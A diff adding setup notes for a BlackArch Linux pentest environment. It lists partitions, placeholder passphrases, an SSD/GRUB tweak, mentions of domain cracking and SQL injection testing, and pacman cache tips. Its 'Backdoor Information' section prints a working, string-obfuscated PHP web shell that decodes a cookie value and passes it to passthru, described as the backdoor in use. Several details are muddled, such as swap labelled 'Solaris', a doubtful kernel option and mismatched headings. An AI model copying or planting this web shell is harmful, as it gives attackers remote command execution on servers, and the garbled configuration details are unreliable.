@@ -1,0 +1,89 @@
+========================================
+Black Arch Linux ( TEST ENVI )
+========================================
+
+- Hostname: 'HOSTNAME_HERE'
+
+Partition Table
+( /boot) ==> /dev/sda1: Boot
+( swap) ==> /dev/sda2: Swap ===> Solaris 
+( root ) ==> /dev/sda3: Root
+
+Passphrase for root ( /dev/sda3 ) ==> 'PASSPHRASE' ( Global )
+User Name ===> ( blackarch )
+BlackArch Password ==> ( PASSPHRASE01 )
+
+LUKS Partition
+- uses ' /dev/sda3 ' passphrase ( This is the same as the root passphrase )
+
+
+
+========================================
+Paraphrases Performance and Testing EnVi
+========================================
+
+
+Used for test purposes only
+-- Domain Sniffing ( HOUND )
+-- Domain Cracking ( Pen Test ) 
+
+-- Pen Test web Domains and SQL Injections 
+
+
+
+========================================
+      SSD Encryption Information 
+========================================
+
+For grub look for the line of the current used kernel
+this is similar of the following
+
+linux/vmlinuz.. root=/dev/mapper/ .. root_trim=yes
+
+---> ( Add it at the end of the line )
+
+
+
+========================================
+      Backdoor Information
+========================================
+
+Pacman Cheatsheets
+1) https://devhints.io/pacman
+2) https://vhernando.github.io/pacman-cheat-sheet-archlinux
+
+
+Installed to the ROOT DR ( /dev/sda3 ) ==> Same Passphrase as ROOT
+
+
+Small backdoor using cookies == https://github.com/jofpin/backcookie
+
+PHP FORMAT BELOW
+
+<?php
+# the code of the backdoor used
+$bOne = "pa"."ss"."th"."ru";
+$bTwo = "ba"."se"."64"."_"."de"."co"."de";
+$bKey = "yourcookie"; # conection backdoor
+$bOne($bTwo($_COOKIE[$bKey]));
+?>
+
+
+
+
+========================================
+      PACMAN Exploit Tips
+========================================
+
+Links
+1) https://wiki.archlinux.org/title/pacman/Tips_and_tricks#Read-only_cache
+
+
+DO NOT SET UP TO EXPOSE THE CACHE WITH IN THE BROWSER
+- CUSTOM DNS 
+- POINT DOMAIN TO <-- BI --> Direction
+- More information -> https://github.com/nroi/flexo
+
+Warning: Do not append /repos/$repo/os/$arch to this custom 
+server like for other entries, as this hierarchy does not 
+exist and therefore queries will fail.
